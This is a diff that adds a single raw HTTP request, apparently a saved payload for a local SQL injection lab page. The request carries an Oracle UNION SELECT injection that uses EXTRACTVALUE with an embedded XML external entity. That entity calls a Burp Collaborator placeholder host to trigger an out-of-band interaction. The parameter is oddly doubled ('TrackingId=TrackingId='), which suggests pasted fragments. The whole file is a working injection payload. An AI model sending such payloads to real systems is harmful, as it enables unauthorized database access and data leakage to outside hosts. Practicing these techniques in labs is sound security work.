@@ -1,0 +1,9 @@
+GET /vulnerabilities/sqli/?id=TrackingId=TrackingId=x%27+UNION+SELECT+EXTRACTVALUE(xmltype(%27%3C%3fxml+version%3d%221.0%22+encoding%3d%22UTF-8%22%3f%3E%3C!DOCTYPE+root+[+%3C!ENTITY+%25+remote+SYSTEM+%22http%3a//BURP-COLLABORATOR-SUBDOMAIN/%22%3E+%25remote%3b]%3E%27),%27/l%27)+FROM+dual-- HTTP/1.1
+Host: 10.10.3.128:2280
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
